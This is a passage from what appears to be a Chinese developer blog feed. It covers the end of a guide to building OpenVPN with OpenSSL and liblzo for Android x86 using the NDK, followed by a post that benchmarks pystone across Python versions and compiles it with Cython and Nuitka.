export RANLIB=$STANDALONE_TOOCHAIN_PATH/bin/i686-linux-android-ranlib
./Configure android-x86 -DOPENSSL_IA32_SSE2 -DAES_ASM -DVPAES_ASM
make
</code></pre><p><code>$STANDALONE_TOOCHAIN_PATH</code>是生成的工具链目录，使用build-openssl4android.sh会自动生成该目录。</p>
<p>经过测试，也是可以的。</p>
<h3 id="编译liblzo"><a href="#编译liblzo" class="headerlink" title="编译liblzo"></a>编译liblzo</h3><p>liblzo源码可以从<a href="http://www.oberhumer.com/opensource/lzo/download/" target="_blank" rel="noopener">http://www.oberhumer.com/opensource/lzo/download/</a>下载。</p>
<p>编译可以参考<a href="https://github.com/fries/android-external-liblzo" target="_blank" rel="noopener">这个项目</a>，在源码根目录下创建<code>jni</code>目录并进入该目录，创建<code>Android.mk</code>文件，输入以下内容：</p>
<pre><code>LOCAL_PATH:= $(call my-dir)

common_SRC_FILES:=  \
    ../src/lzo_crc.c \
    ../src/lzo_init.c \
    ../src/lzo_ptr.c \
    ../src/lzo_str.c \
    ../src/lzo_util.c \
    ../src/lzo1.c \
    ../src/lzo1_99.c \
    ../src/lzo1a.c \
    ../src/lzo1a_99.c \
    ../src/lzo1b_1.c \
    ../src/lzo1b_2.c \
    ../src/lzo1b_3.c \
    ../src/lzo1b_4.c \
    ../src/lzo1b_5.c \
    ../src/lzo1b_6.c \
    ../src/lzo1b_7.c \
    ../src/lzo1b_8.c \
    ../src/lzo1b_9.c \
    ../src/lzo1b_99.c \
    ../src/lzo1b_9x.c \
    ../src/lzo1b_cc.c \
    ../src/lzo1b_d1.c \
    ../src/lzo1b_d2.c \
    ../src/lzo1b_rr.c \
    ../src/lzo1b_xx.c \
    ../src/lzo1c_1.c \
    ../src/lzo1c_2.c \
    ../src/lzo1c_3.c \
    ../src/lzo1c_4.c \
    ../src/lzo1c_5.c \
    ../src/lzo1c_6.c \
    ../src/lzo1c_7.c \
    ../src/lzo1c_8.c \
    ../src/lzo1c_9.c \
    ../src/lzo1c_99.c \
    ../src/lzo1c_d1.c \
    ../src/lzo1c_d2.c \
    ../src/lzo1c_rr.c \
    ../src/lzo1c_xx.c \
    ../src/lzo1f_1.c \
    ../src/lzo1f_9x.c \
    ../src/lzo1f_d1.c \
    ../src/lzo1f_d2.c \
    ../src/lzo1x_1.c \
    ../src/lzo1x_9x.c \
    ../src/lzo1x_d1.c \
    ../src/lzo1x_d2.c \
    ../src/lzo1x_d3.c \
    ../src/lzo1x_o.c \
    ../src/lzo1x_1k.c \
    ../src/lzo1x_1l.c \
    ../src/lzo1x_1o.c \
    ../src/lzo1y_1.c \
    ../src/lzo1y_9x.c \
    ../src/lzo1y_d1.c \
    ../src/lzo1y_d2.c \
    ../src/lzo1y_d3.c \
    ../src/lzo1y_o.c \
    ../src/lzo1z_9x.c \
    ../src/lzo1z_d1.c \
    ../src/lzo1z_d2.c \
    ../src/lzo1z_d3.c \
    ../src/lzo2a_9x.c \
    ../src/lzo2a_d1.c \
    ../src/lzo2a_d2.c


common_C_INCLUDES += $(LOCAL_PATH)/../include

# static library
# =====================================================

include $(CLEAR_VARS)
LOCAL_SRC_FILES:= $(common_SRC_FILES)
LOCAL_C_INCLUDES:= $(common_C_INCLUDES)
LOCAL_MODULE := liblzo
LOCAL_PRELINK_MODULE:= false
include $(BUILD_STATIC_LIBRARY)
</code></pre><p>然后，再创建<code>Application.mk</code>文件，输入以下内容：</p>
<pre><code># The ARMv7 is significanly faster due to the use of the hardware FPU
NDK_TOOLCHAIN_VERSION := 4.9
APP_ABI := x86  
#
APP_PLATFORM := android-8
#APP_STL:=stlport_static
APP_STL := gnustl_static
APP_CPPFLAGS += -std=c++11
</code></pre><p>这样可以只编译x86版本。</p>
<p>最后，调用ndk编译（<code>$NDK</code>为NDK根目录）。</p>
<blockquote>
<p>$NDK/ndk-build</p>
</blockquote>
<p>编译完会生成<code>/path/to/liblzo/source/obj/local/x86/liblzo.a</code>文件。</p>
<h2 id="0x02-编译openvpn"><a href="#0x02-编译openvpn" class="headerlink" title="0x02 编译openvpn"></a>0x02 编译openvpn</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>进入openvpn源码根目录，执行：</p>
<blockquote>
<p>./configure</p>
</blockquote>
<p>这步操作主要是为了生成<code>config.h</code>文件，里面包含了编译时用到的各种宏定义。</p>
<p>在源码根目录下创建<code>jni</code>目录，将<code>config.h</code>拷贝到<code>jni</code>目录中，并编辑该文件。</p>
<ul>
<li>注释掉<code>#define HAVE_GETPASS 1</code>行，因为Android中没有<code>getpass</code>函数</li>
<li>将<code>#define IFCONFIG_PATH &quot;/sbin/ifconfig&quot;</code>修改为<code>#define IFCONFIG_PATH &quot;/system/bin/ifconfig&quot;</code></li>
<li>将<code>#define IPROUTE_PATH &quot;/sbin/ip&quot;</code>修改为<code>#define IPROUTE_PATH &quot;/system/bin/ip&quot;</code></li>
<li>将<code>#define ROUTE_PATH &quot;/sbin/route&quot;</code>修改为<code>#define ROUTE_PATH &quot;/system/bin/route&quot;</code></li>
</ul>
<p>进入<code>jni</code>目录，使用前面的方法创建<code>Application.mk</code>文件；然后创建<code>Android.mk</code>文件，输入以下内容（修改自：<a href="https://github.com/fries/android-external-openvpn/blob/master/Android.mk" target="_blank" rel="noopener">https://github.com/fries/android-external-openvpn/blob/master/Android.mk</a>）：</p>
<pre><code>LOCAL_PATH:= $(call my-dir)

#on a 32bit maschine run ./configure --enable-password-save --disable-pkcs11 --with-ifconfig-path=/system/bin/ifconfig --with-route-path=/system/bin/route
#from generated Makefile copy variable contents of openvpn_SOURCES to common_SRC_FILES
# append missing.c to the end of the list
# missing.c defines undefined functions.
# in tun.c replace /dev/net/tun with /dev/tun


include $(CLEAR_VARS)
LOCAL_MODULE := libcrypto
LOCAL_SRC_FILES := $(LOCAL_PATH)/openssl/$(TARGET_ARCH_ABI)/lib/libcrypto.a
include $(PREBUILT_STATIC_LIBRARY)

include $(CLEAR_VARS)
LOCAL_MODULE := libssl
LOCAL_SRC_FILES := $(LOCAL_PATH)/openssl/$(TARGET_ARCH_ABI)/lib/libssl.a
include $(PREBUILT_STATIC_LIBRARY)

include $(CLEAR_VARS)
LOCAL_MODULE := liblzo
LOCAL_SRC_FILES := $(LOCAL_PATH)/liblzo/$(TARGET_ARCH_ABI)/lib/liblzo.a
include $(PREBUILT_STATIC_LIBRARY)

include $(CLEAR_VARS)

common_SRC_FILES:= \
        ../src/openvpn/openvpn.c \
        ../src/openvpn/base64.c \
        ../src/openvpn/buffer.c \
        ../src/openvpn/clinat.c \
        ../src/openvpn/console.c \
        ../src/openvpn/cryptoapi.c \
        ../src/openvpn/crypto.c \
        ../src/openvpn/crypto_openssl.c \
        ../src/openvpn/dhcp.c \
        ../src/openvpn/error.c \
        ../src/openvpn/event.c \
        ../src/openvpn/fdmisc.c \
        ../src/openvpn/forward.c \
        ../src/openvpn/fragment.c \
        ../src/openvpn/gremlin.c \
        ../src/openvpn/helper.c \
        ../src/openvpn/httpdigest.c \
        ../src/openvpn/init.c \
        ../src/openvpn/interval.c \
        ../src/openvpn/list.c \
        ../src/openvpn/lladdr.c \
        ../src/openvpn/lzo.c \
        ../src/openvpn/manage.c \
        ../src/openvpn/mbuf.c \
        ../src/openvpn/misc.c \
        ../src/openvpn/mroute.c \
        ../src/openvpn/mss.c \
        ../src/openvpn/mstats.c \
        ../src/openvpn/mtcp.c \
        ../src/openvpn/mtu.c \
        ../src/openvpn/mudp.c \
        ../src/openvpn/multi.c \
        ../src/openvpn/ntlm.c \
        ../src/openvpn/occ.c \
        ../src/openvpn/options.c \
        ../src/openvpn/otime.c \
        ../src/openvpn/packet_id.c \
        ../src/openvpn/perf.c \
        ../src/openvpn/pf.c \
        ../src/openvpn/ping.c \
        ../src/openvpn/pkcs11.c \
        ../src/openvpn/pkcs11_openssl.c \
        ../src/openvpn/platform.c \
        ../src/openvpn/plugin.c \
        ../src/openvpn/pool.c \
        ../src/openvpn/proto.c \
        ../src/openvpn/proxy.c \
        ../src/openvpn/ps.c \
        ../src/openvpn/push.c \
        ../src/openvpn/reliable.c \
        ../src/openvpn/route.c \
        ../src/openvpn/schedule.c \
        ../src/openvpn/session_id.c \
        ../src/openvpn/shaper.c \
        ../src/openvpn/sig.c \
        ../src/openvpn/socket.c \
        ../src/openvpn/socks.c \
        ../src/openvpn/ssl.c \
        ../src/openvpn/ssl_openssl.c \
        ../src/openvpn/ssl_verify.c \
        ../src/openvpn/ssl_verify_openssl.c \
        ../src/openvpn/status.c \
        ../src/openvpn/tun.c 

common_CFLAGS += -DHAVE_CONFIG_H

common_C_INCLUDES += \
    $(LOCAL_PATH)/openssl/include \
    $(LOCAL_PATH)/liblzo/include \
    $(LOCAL_PATH)/../include \
    $(LOCAL_PATH)/../src/compat

common_SHARED_LIBRARIES := 



# static linked binary
# =====================================================

include $(CLEAR_VARS)
LOCAL_SRC_FILES:= $(common_SRC_FILES)
LOCAL_CFLAGS:= $(common_CFLAGS)
LOCAL_C_INCLUDES:= $(common_C_INCLUDES)

LOCAL_SHARED_LIBRARIES += $(common_SHARED_LIBRARIES)
LOCAL_STATIC_LIBRARIES:= libssl libcrypto liblzo
LOCAL_LDLIBS += -lz

LOCAL_MODULE:= openvpn
LOCAL_MODULE_PATH := $(TARGET_OUT_OPTIONAL_EXECUTABLES)
include $(BUILD_EXECUTABLE)
</code></pre><p>将<code>libcrypto.a</code>和<code>libssl.a</code>拷贝到<code>jni/openssl/x86/lib</code>目录下（自行创建）。<br>将<code>liblzo.a</code>拷贝到<code>jni/liblzo/x86/lib</code>目录下。<br>将liblzo源码根目录下的<code>include</code>目录拷贝到<code>jni/liblzo</code>目录下。<br>将openssl源码根目录下的<code>include</code>目录拷贝到<code>jni/openssl</code>目录下。  </p>
<h3 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h3><blockquote>
<p>$NDK/ndk-build</p>
</blockquote>
<p>完成后，会生成<code>/path/to/openvpn/source/libs/x86/openvpn</code>文件。</p>
<h2 id="0x03-使用Android模拟器测试"><a href="#0x03-使用Android模拟器测试" class="headerlink" title="0x03 使用Android模拟器测试"></a>0x03 使用Android模拟器测试</h2><p>将<code>openvpn</code>拷贝到模拟器，修改可执行权限；准备好<code>ovpn</code>文件。</p>
<ol>
<li>确保<code>ovpn</code>文件中存在<code>dev-node /dev/tun</code>这行，因为Android中和Linux中tun设备路径不一致</li>
<li>由于默认临时目录为<code>/tmp</code>，需要修改为<code>export TMPDIR=/data/local/tmp</code>；不要通过在命令行增加<code>--tmp-dir /data/local/tmp</code>的方法来实现，否则会导致<code>ovpn</code>文件里的配置项无法被正常加载</li>
<li><code>ip rule add from 0/0 table main pref 1000</code>修改默认路由表的优先级，避免openvpn修改的路由信息不生效（我不确定这种做法会不会有副作用）</li>
<li><code>./openvpn client.ovpn</code></li>
</ol>
<p>如果一切顺利的话，此时已经连接成功，可以使用浏览器打开ip138.com进行测试。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>OpenVPN</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Cython和Nuitka编译Python脚本</title>
    <url>/2022/09/14/build-python-with-cython-and-nuitka/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在Python中，可以使用<code>py2exe</code>或<code>PyInstaller</code>之类的工具将Python脚本编译成二进制文件，从而提升可移植性，并在一定程度上提升了性能。不过这类工具的实现只是将py文件编译成pyc或pyo，在安全性上还是弱了一些，存在被反编译的风险。</p>
<p>为了测试不同编译方式的性能差异，这里统一使用python2.7中提供的<code>test/pystone.py</code>作为执行脚本。由于这个脚本不支持python3，因此做了下python3的适配。完整的测试代码如下：</p>
<pre><code class="python">#! /usr/bin/env python

&quot;&quot;&quot;
&quot;PYSTONE&quot; Benchmark Program

Version:        Python/1.1 (corresponds to C/1.1 plus 2 Pystone fixes)

Author:         Reinhold P. Weicker,  CACM Vol 27, No 10, 10/84 pg. 1013.

                Translated from ADA to C by Rick Richardson.
                Every method to preserve ADA-likeness has been used,
                at the expense of C-ness.

                Translated from C to Python by Guido van Rossum.

Version History:

                Version 1.1 corrects two bugs in version 1.0:

                First, it leaked memory: in Proc1(), NextRecord ends
                up having a pointer to itself.  I have corrected this
                by zapping NextRecord.PtrComp at the end of Proc1().

                Second, Proc3() used the operator != to compare a
                record to None.  This is rather inefficient and not
                true to the intention of the original benchmark (where
                a pointer comparison to None is intended; the !=
                operator attempts to find a method __cmp__ to do value
                comparison of the record).  Version 1.1 runs 5-10
                percent faster than version 1.0, so benchmark figures
                of different versions can&#39;t be compared directly.

&quot;&quot;&quot;

LOOPS = 50000

try:
    from time import perf_counter as clock
except ImportError:
    from time import clock

__version__ = &quot;1.1&quot;

[Ident1, Ident2, Ident3, Ident4, Ident5] = range(1, 6)

class Record:

    def __init__(self, PtrComp = None, Discr = 0, EnumComp = 0,
                       IntComp = 0, StringComp = 0):
        self.PtrComp = PtrComp
        self.Discr = Discr
        self.EnumComp = EnumComp
        self.IntComp = IntComp
        self.StringComp = StringComp

    def copy(self):
        return Record(self.PtrComp, self.Discr, self.EnumComp,
                      self.IntComp, self.StringComp)

TRUE = 1
FALSE = 0

def main(loops=LOOPS):
    benchtime, stones = pystones(loops)
    print(&quot;Pystone(%s) time for %d passes = %g&quot; % \
          (__version__, loops, benchtime))
    print(&quot;This machine benchmarks at %g pystones/second&quot; % stones)


def pystones(loops=LOOPS):
    return Proc0(loops)

IntGlob = 0
BoolGlob = FALSE
Char1Glob = &#39;\0&#39;
Char2Glob = &#39;\0&#39;
Array1Glob = [0]*51
Array2Glob = list(map(lambda x: x[:], [Array1Glob]*51))
PtrGlb = None
PtrGlbNext = None

def Proc0(loops=LOOPS):
    global IntGlob
    global BoolGlob
    global Char1Glob
    global Char2Glob
    global Array1Glob
    global Array2Glob
    global PtrGlb
    global PtrGlbNext

    starttime = clock()
    for i in range(loops):
        pass
    nulltime = clock() - starttime

    PtrGlbNext = Record()
    PtrGlb = Record()
    PtrGlb.PtrComp = PtrGlbNext
    PtrGlb.Discr = Ident1
    PtrGlb.EnumComp = Ident3
    PtrGlb.IntComp = 40
    PtrGlb.StringComp = &quot;DHRYSTONE PROGRAM, SOME STRING&quot;
    String1Loc = &quot;DHRYSTONE PROGRAM, 1&#39;ST STRING&quot;
    Array2Glob[8][7] = 10

    starttime = clock()

    for i in range(loops):
        Proc5()
        Proc4()
        IntLoc1 = 2
        IntLoc2 = 3
        String2Loc = &quot;DHRYSTONE PROGRAM, 2&#39;ND STRING&quot;
        EnumLoc = Ident2
        BoolGlob = not Func2(String1Loc, String2Loc)
        while IntLoc1 &lt; IntLoc2:
            IntLoc3 = 5 * IntLoc1 - IntLoc2
            IntLoc3 = Proc7(IntLoc1, IntLoc2)
            IntLoc1 = IntLoc1 + 1
        Proc8(Array1Glob, Array2Glob, IntLoc1, IntLoc3)
        PtrGlb = Proc1(PtrGlb)
        CharIndex = &#39;A&#39;
        while CharIndex &lt;= Char2Glob:
            if EnumLoc == Func1(CharIndex, &#39;C&#39;):
                EnumLoc = Proc6(Ident1)
            CharIndex = chr(ord(CharIndex)+1)
        IntLoc3 = IntLoc2 * IntLoc1
        IntLoc2 = IntLoc3 / IntLoc1
        IntLoc2 = 7 * (IntLoc3 - IntLoc2) - IntLoc1
        IntLoc1 = Proc2(IntLoc1)

    benchtime = clock() - starttime - nulltime
    if benchtime == 0.0:
        loopsPerBenchtime = 0.0
    else:
        loopsPerBenchtime = (loops / benchtime)
    return benchtime, loopsPerBenchtime

def Proc1(PtrParIn):
    PtrParIn.PtrComp = NextRecord = PtrGlb.copy()
    PtrParIn.IntComp = 5
    NextRecord.IntComp = PtrParIn.IntComp
    NextRecord.PtrComp = PtrParIn.PtrComp
    NextRecord.PtrComp = Proc3(NextRecord.PtrComp)
    if NextRecord.Discr == Ident1:
        NextRecord.IntComp = 6
        NextRecord.EnumComp = Proc6(PtrParIn.EnumComp)
        NextRecord.PtrComp = PtrGlb.PtrComp
        NextRecord.IntComp = Proc7(NextRecord.IntComp, 10)
    else:
        PtrParIn = NextRecord.copy()
    NextRecord.PtrComp = None
    return PtrParIn

def Proc2(IntParIO):
    IntLoc = IntParIO + 10
    while 1:
        if Char1Glob == &#39;A&#39;:
            IntLoc = IntLoc - 1
            IntParIO = IntLoc - IntGlob
            EnumLoc = Ident1
        if EnumLoc == Ident1:
            break
    return IntParIO

def Proc3(PtrParOut):
    global IntGlob

    if PtrGlb is not None:
        PtrParOut = PtrGlb.PtrComp
    else:
        IntGlob = 100
    PtrGlb.IntComp = Proc7(10, IntGlob)
    return PtrParOut

def Proc4():
    global Char2Glob

    BoolLoc = Char1Glob == &#39;A&#39;
    BoolLoc = BoolLoc or BoolGlob
    Char2Glob = &#39;B&#39;

def Proc5():
    global Char1Glob
    global BoolGlob

    Char1Glob = &#39;A&#39;
    BoolGlob = FALSE

def Proc6(EnumParIn):
    EnumParOut = EnumParIn
    if not Func3(EnumParIn):
        EnumParOut = Ident4
    if EnumParIn == Ident1:
        EnumParOut = Ident1
    elif EnumParIn == Ident2:
        if IntGlob &gt; 100:
            EnumParOut = Ident1
        else:
            EnumParOut = Ident4
    elif EnumParIn == Ident3:
        EnumParOut = Ident2
    elif EnumParIn == Ident4:
        pass
    elif EnumParIn == Ident5:
        EnumParOut = Ident3
    return EnumParOut

def Proc7(IntParI1, IntParI2):
    IntLoc = IntParI1 + 2
    IntParOut = IntParI2 + IntLoc
    return IntParOut

def Proc8(Array1Par, Array2Par, IntParI1, IntParI2):
    global IntGlob

    IntLoc = IntParI1 + 5
    Array1Par[IntLoc] = IntParI2
    Array1Par[IntLoc+1] = Array1Par[IntLoc]
    Array1Par[IntLoc+30] = IntLoc
    for IntIndex in range(IntLoc, IntLoc+2):
        Array2Par[IntLoc][IntIndex] = IntLoc
    Array2Par[IntLoc][IntLoc-1] = Array2Par[IntLoc][IntLoc-1] + 1
    Array2Par[IntLoc+20][IntLoc] = Array1Par[IntLoc]
    IntGlob = 5

def Func1(CharPar1, CharPar2):
    CharLoc1 = CharPar1
    CharLoc2 = CharLoc1
    if CharLoc2 != CharPar2:
        return Ident1
    else:
        return Ident2

def Func2(StrParI1, StrParI2):
    IntLoc = 1
    while IntLoc &lt;= 1:
        if Func1(StrParI1[IntLoc], StrParI2[IntLoc+1]) == Ident1:
            CharLoc = &#39;A&#39;
            IntLoc = IntLoc + 1
    if CharLoc &gt;= &#39;W&#39; and CharLoc &lt;= &#39;Z&#39;:
        IntLoc = 7
    if CharLoc == &#39;X&#39;:
        return TRUE
    else:
        if StrParI1 &gt; StrParI2:
            IntLoc = IntLoc + 7
            return TRUE
        else:
            return FALSE

def Func3(EnumParIn):
    EnumLoc = EnumParIn
    if EnumLoc == Ident3: return TRUE
    return FALSE

if __name__ == &#39;__main__&#39;:
    import sys
    def error(msg):
        print &gt;&gt;sys.stderr, msg,
        print &gt;&gt;sys.stderr, &quot;usage: %s [number_of_loops]&quot; % sys.argv[0]
        sys.exit(100)
    nargs = len(sys.argv) - 1
    if nargs &gt; 1:
        error(&quot;%d arguments are too many;&quot; % nargs)
    elif nargs == 1:
        try: loops = int(sys.argv[1])
        except ValueError:
            error(&quot;Invalid argument %r;&quot; % sys.argv[1])
    else:
        loops = LOOPS
    main(loops)
</code></pre>
<p>以下测试数据均为连续执行3次，取最大值。</p>
<h2 id="0x01-不同Python版本的测试数据"><a href="#0x01-不同Python版本的测试数据" class="headerlink" title="0x01 不同Python版本的测试数据"></a>0x01 不同Python版本的测试数据</h2><ul>
<li><p>Python 2.7</p>
<pre><code>Pystone(1.1) time for 50000 passes = 0.178948
This machine benchmarks at 279411 pystones/second
</code></pre></li>
<li><p>Python 3.7</p>
<pre><code>Pystone(1.1) time for 50000 passes = 0.201795
This machine benchmarks at 247777 pystones/second
</code></pre></li>
<li><p>Python 3.8</p>
<pre><code>Pystone(1.1) time for 50000 passes = 0.222014
This machine benchmarks at 225211 pystones/second
</code></pre></li>
<li><p>Python 3.9</p>
<pre><code>Pystone(1.1) time for 50000 passes = 0.223407
This machine benchmarks at 223807 pystones/second
</code></pre></li>
<li><p>Python 3.10</p>
<pre><code>Pystone(1.1) time for 50000 passes = 0.265725
This machine benchmarks at 188164 pystones/second
</code></pre></li>
<li><p>Python 3.11</p>
<pre><code>Pystone(1.1) time for 50000 passes = 0.104691
This machine benchmarks at 477596 pystones/second
</code></pre></li>
</ul>
<p>可以看到，Python 3.11版本有了明显的性能提升，这个与官方的宣传也是一致的。</p>
<h2 id="0x02-使用Cython编译python脚本"><a href="#0x02-使用Cython编译python脚本" class="headerlink" title="0x02 使用Cython编译python脚本"></a>0x02 使用Cython编译python脚本</h2><pre><code class="bash">$ pip install cython
$ cython -3 --embed pystone.py
$ gcc -pthread -fPIC -fwrapv -O2 -Wall -fno-strict-aliasing -I/usr/include/python3.7 -l:libpython3.7m.so -o pystone pystone.c
$ ls -l pystone
-rwxrwxrwx 1 drunkdream drunkdream 178928 Sep  6 15:42 pystone
$ readelf -d pystone
Dynamic section at offset 0x1fd08 contains 26 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libpython3.7m.so.1.0]
 0x0000000000000001 (NEEDED)             Shared library: [libpthread.so.0]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x403000
 0x000000000000000d (FINI)               0x41b514
 0x0000000000000019 (INIT_ARRAY)         0x420cf8
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x420d00
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x400308
 0x0000000000000005 (STRTAB)             0x401078
 0x0000000000000006 (SYMTAB)             0x400328
 0x000000000000000a (STRSZ)              2404 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x421000
 0x0000000000000002 (PLTRELSZ)           2592 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x401e30
 0x0000000000000007 (RELA)               0x401b18
 0x0000000000000008 (RELASZ)             792 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffe (VERNEED)            0x401af8
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x4019dc
 0x0000000000000000 (NULL)               0x0
$ ./pystone
Pystone(1.1) time for 50000 passes = 0.171947
This machine benchmarks at 290787 pystones/second
</code></pre>
<p>可以看出，编译成二进制文件后，性能上略有提升，并且需要依赖<code>libpython3.7m.so</code>才能运行。下面是<code>pystone.c</code>文件的部分代码：</p>
<pre><code class="c">  /* &quot;pystone.py&quot;:73
 *     return Proc0(loops)
 * 
 * IntGlob = 0             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
 * BoolGlob = FALSE
 * Char1Glob = &#39;\0&#39;
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_IntGlob, __pyx_int_0) &lt; 0) __PYX_ERR(0, 73, __pyx_L1_error)

  /* &quot;pystone.py&quot;:74
 * 
 * IntGlob = 0
 * BoolGlob = FALSE             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
 * Char1Glob = &#39;\0&#39;
 * Char2Glob = &#39;\0&#39;
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_FALSE); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BoolGlob, __pyx_t_7) &lt; 0) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* &quot;pystone.py&quot;:75
 * IntGlob = 0
 * BoolGlob = FALSE
 * Char1Glob = &#39;\0&#39;             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
 * Char2Glob = &#39;\0&#39;
 * Array1Glob = [0]*51
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Char1Glob, __pyx_kp_u__12) &lt; 0) __PYX_ERR(0, 75, __pyx_L1_error)

  /* &quot;pystone.py&quot;:76
 * BoolGlob = FALSE
 * Char1Glob = &#39;\0&#39;
 * Char2Glob = &#39;\0&#39;             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
 * Array1Glob = [0]*51
 * Array2Glob = list(map(lambda x: x[:], [Array1Glob]*51))
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Char2Glob, __pyx_kp_u__12) &lt; 0) __PYX_ERR(0, 76, __pyx_L1_error)

  /* &quot;pystone.py&quot;:77
 * Char1Glob = &#39;\0&#39;
 * Char2Glob = &#39;\0&#39;
 * Array1Glob = [0]*51             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
 * Array2Glob = list(map(lambda x: x[:], [Array1Glob]*51))
 * PtrGlb = None
 */
  __pyx_t_7 = PyList_New(1 * 51); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  { Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp &lt; 51; __pyx_temp++) {
      __Pyx_INCREF(__pyx_int_0);
      __Pyx_GIVEREF(__pyx_int_0);
      PyList_SET_ITEM(__pyx_t_7, __pyx_temp, __pyx_int_0);
    }
  }
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Array1Glob, __pyx_t_7) &lt; 0) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
</code></pre>
<p>可以看出，C代码本身就已经很难读懂了，编译后的二进制文件基本是不可能还原出原始的python代码的。</p>
<p>不过，目前这种方式有个问题，就是只能编译单个文件。但很多时候，我们是想将多个包编译成一个独立的可执行文件。</p>
<h2 id="0x03-使用Nuitka编译Python脚本"><a href="#0x03-使用Nuitka编译Python脚本" class="headerlink" title="0x03 使用Nuitka编译Python脚本"></a>0x03 使用Nuitka编译Python脚本</h2><pre><code>$ pip install nuitka
$ nuitka pystone.py
Nuitka-Options:INFO: Used command line options: pystone.py
Nuitka-Options:WARNING: You did not specify to follow or include anything but main program. Check options
Nuitka-Options:WARNING: and make sure that is intended.                                                     
Nuitka:WARNING: Using very slow fallback for ordered sets, please install &#39;orderedset&#39; PyPI package for best
Nuitka:WARNING: Python compile time performance.                                                            
Nuitka:INFO: Starting Python compilation with Nuitka &#39;1.1.8&#39; on Python &#39;3.7&#39; commercial grade &#39;not installed&#39;.
Nuitka:INFO: Completed Python level compilation and optimization.
Nuitka:INFO: Generating source code for C backend compiler.
Nuitka:INFO: Running data composer tool for optimal constant value handling.
Nuitka:INFO: Running C compilation via Scons.
Nuitka-Scons:INFO: Backend C compiler: gcc (gcc).
Nuitka-Scons:INFO: Backend linking program with 9 files (no progress information available).
Nuitka-Scons:WARNING: You are not using ccache.
Nuitka:INFO: Keeping build directory &#39;pystone.build&#39;.                                                       
Nuitka:INFO: Successfully created &#39;pystone.bin&#39;.
$ ls -l pystone.bin
-rwxrwxrwx 1 drunkdream drunkdream 268440 Sep  6 20:57 pystone.bin
$ ./pystone.bin
Pystone(1.1) time for 50000 passes = 0.12965
This machine benchmarks at 385654 pystones/second
</code></pre><p>可以看到使用<code>nuitka</code>性能上明显比原生的Python要高出许多。</p>
<p>本来想在Python 3.11下测试下性能，不过发现目前最新版本的<code>nuitka</code>还没适配Python 3.11，编译会有报错。</p>
<p><code>nuitka</code>还有些可选参数，比较重要的有：</p>
<ul>
<li><code>-o FILENAME</code>: 指定要生成的文件名</li>
<li><code>--standalone</code>: 将依赖库都编译到一个文件中，不过对于依赖的动态链接库，还是会以多个文件的形式存在</li>
<li><code>--onefile</code>: 这个参数可以解决<code>--standalone</code>参数会有多个文件的问题，保证最终生成的是一个可执行文件</li>
<li><code>--nofollow-imports</code>: 不编译import进来的第三方库</li>
<li><code>--clang</code>: 强制使用clang作为编译后端</li>
<li><code>--static-libpython=yes</code>: 静态链接libpython</li>
<li><code>--show-scons</code>: 显示编译C代码过程中的详细日志</li>
</ul>
<p>通过观察可以发现，nuitka也是通过将python代码转换成C代码，然后编译成最终的可执行文件。使用<code>--static-libpython=yes</code>参数可以静态链接libpython库，使用的命令行如下：</p>
<pre><code class="bash">$ gcc -o pystone.bin -fuse-linker-plugin -flto=8 -fpartial-inlining -freorder-functions -O2 -s -z noexecstack -Wl,-R,&#39;/usr/lib&#39; -Wl,--disable-new-dtags -Wl,-b -Wl,binary -Wl,./__constants.bin -Wl,-b -Wl,elf64-x86-64 -Wl,-defsym -Wl,constant_bin_data=_binary_____constants_bin_start @&quot;./@link_input.txt&quot; -L/usr/lib -ldl -lm /usr/lib/libpython3.7m.a
</code></pre>
<p>不过在实际执行时会有报错，原因是命令行中没有包含<code>-lz -lpthread -lexpat -lutil</code>等参数，针对这个问题有一个专门的<a href="https://github.com/Nuitka/Nuitka/issues/1761" target="_blank" rel="noopener">issue</a>。</p>
